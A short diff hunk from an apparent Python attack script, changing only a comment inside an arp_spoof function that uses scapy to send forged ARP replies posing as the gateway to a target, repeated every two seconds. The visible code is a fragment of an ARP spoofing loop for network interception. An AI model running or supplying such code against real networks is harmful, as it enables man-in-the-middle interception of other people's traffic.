@@ -8,7 +8,7 @@ def arp_spoof(target_ip, gateway_ip, interface="eth0"):
             arp_response = ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, op='is-at')
             # Send ARP fake package with scapy function
             send(arp_response, verbose=0, iface=interface)
-            # Wait 2 sec until next
+            # Wait 2 sec until next try
             time.sleep(2)
     except KeyboardInterrupt:
         # If interrupt/stop command is sent, spoofing get stopped
